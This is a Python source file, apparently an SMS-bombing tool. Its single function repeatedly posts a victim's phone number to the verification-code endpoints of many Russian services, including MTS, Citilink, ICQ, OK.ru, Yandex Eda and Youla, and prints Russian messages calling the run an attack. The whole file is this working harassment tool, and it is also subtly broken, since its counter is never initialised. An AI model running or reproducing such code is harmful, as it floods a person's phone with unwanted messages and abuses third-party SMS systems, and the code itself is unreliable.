


def SMS(_phone, start_time, CLOSE_AFTER, phone9, _phone9, _phonePizzahut, _name, name, _email, email, password, username):
    while True:
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink отправлено!|| Кол-во - ' + str(R))

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Не отправлено!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            R = R + 1
            print('[+] Youla отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
